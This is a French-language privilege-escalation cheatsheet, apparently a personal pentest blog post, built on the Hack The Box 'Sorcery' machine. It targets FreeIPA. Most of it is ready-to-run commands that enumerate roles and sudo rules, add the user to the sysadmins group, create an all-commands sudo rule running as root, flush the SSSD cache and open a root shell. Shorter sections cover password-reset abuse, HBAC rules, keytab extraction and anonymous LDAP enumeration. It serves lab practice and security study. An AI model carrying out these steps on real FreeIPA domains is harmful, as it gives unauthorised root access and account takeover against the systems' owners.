---
title: "FreeIPA Privilege Escalation"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "FreeIPA utilise des roles, privileges et permissions hiérarchiques. Un utilisateur peut avoir des 'Indirect Memberships' via ses groupes, lui donnant des capacités insoupconnees. L'exploitation repose"
summary: "PrivEsc | FreeIPA Privilege Escalation"
tags:
  - "Privilege Escalation"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "PrivEsc"
ShowToc: true
TocOpen: false
---

## Concept
FreeIPA utilise des roles, privileges et permissions hiérarchiques. Un utilisateur peut avoir des "Indirect Memberships" via ses groupes, lui donnant des capacités insoupconnees. L'exploitation repose sur l'abus de ces roles pour escalader progressivement : s'ajouter a un groupe privilegie, puis utiliser les nouveaux privileges pour creer des sudo rules arbitraires.

## Enumeration

### Lister les roles et privileges d'un user
```bash
kinit <user>
ipa user-show <user> --all    # Chercher "Indirect Member of role:"
ipa group-show <group> --all  # Idem pour les groupes
```

### Lister les groupes et roles
```bash
ipa role-find
ipa role-show <role> --all
ipa privilege-find
ipa privilege-show <privilege> --all
ipa group-find
ipa group-show sysadmins --all
```

### Lister les sudo rules
```bash
ipa sudorule-find
ipa sudorule-show <rule> --all
```

## Exploitation: Group Role Abuse -> Sudo Rule Injection

### Scenario (Sorcery HTB)
```
ash_winter
  └─ Indirect Member of role: add_sysadmin
       └─ Peut s'ajouter au groupe sysadmins
            └─ sysadmins: Indirect Member of role: manage_sudorules_ldap
                 └─ Peut creer/modifier des sudo rules via IPA
```

### Prerequis: HOME directory
Si le home n'existe pas (common pour les users IPA), les commandes `ipa` echouent :
```bash
export HOME=/tmp
mkdir -p /tmp/.ipa/log
```

### Etape 1: S'ajouter au groupe privilegie
```bash
ipa group-add-member sysadmins --users=<user>
```

### Etape 2: Appliquer les changements (SSSD cache)
Les changements FreeIPA ne sont PAS immediats. SSSD cache les groupes et sudo rules. Il faut forcer le refresh :
```bash
# Si on a le droit de restart sssd :
sudo /usr/bin/systemctl restart sssd

# Alternatives :
sss_cache -E                    # Invalide tout le cache SSSD
sudo sssctl cache-expire -E     # Expire tout le cache
# Ou attendre le TTL (souvent 5-15 minutes)
```

### Etape 3: Creer une sudo rule IPA
```bash
# Rule avec tous les droits
ipa sudorule-add <rule_name> --cmdcat=all --hostcat=all
ipa sudorule-add-user <rule_name> --users=<user>
ipa sudorule-add-runasuser <rule_name> --users=root
ipa sudorule-add-runasgroup <rule_name> --groups=root
```

### Etape 4: Appliquer et exploiter
```bash
sudo /usr/bin/systemctl restart sssd   # Refresh cache
sudo -u root /bin/bash                 # Root shell
```

## Autres vecteurs FreeIPA

### Delegation de password reset
Si un role permet `user-mod --setattr userPassword=`, on peut reset le password d'autres users IPA.

### HBAC rules
Les Host-Based Access Control rules controlent qui peut se connecter ou. Un role avec `manage_hbac` peut s'autoriser l'acces SSH a n'importe quel host.

### Keytab extraction
Si on a acces au DC ou au fichier keytab d'un service :
```bash
# Extraire le keytab
klist -kt /etc/krb5.keytab
# Utiliser pour s'authentifier comme le service/host
kinit -kt /etc/krb5.keytab host/hostname@REALM
```

### ksu.mit (Kerberos su)
SUID binary qui permet de devenir un autre user si le principal Kerberos est autorise (via `.k5login` ou mapping).

## Commandes utiles

```bash
# Authentification Kerberos
kinit <user>@REALM
klist

# Enumeration complete
ipa user-find --all
ipa group-find --all
ipa role-find --all
ipa sudorule-find --all
ipa hbacrule-find --all

# LDAP anonyme (si disponible)
ldapsearch -x -H ldap://<dc_ip> -b "cn=users,cn=accounts,dc=domain,dc=tld" uid
ldapsearch -x -H ldap://<dc_ip> -b "cn=groups,cn=accounts,dc=domain,dc=tld" cn
ldapsearch -x -H ldap://<dc_ip> -b "cn=roles,cn=accounts,dc=domain,dc=tld" cn

# Verifier sudo rules appliquees
sudo -l
```

## Ref
- Source: Sorcery HTB (Insane)
- FreeIPA docs: https://freeipa.org/page/Documentation
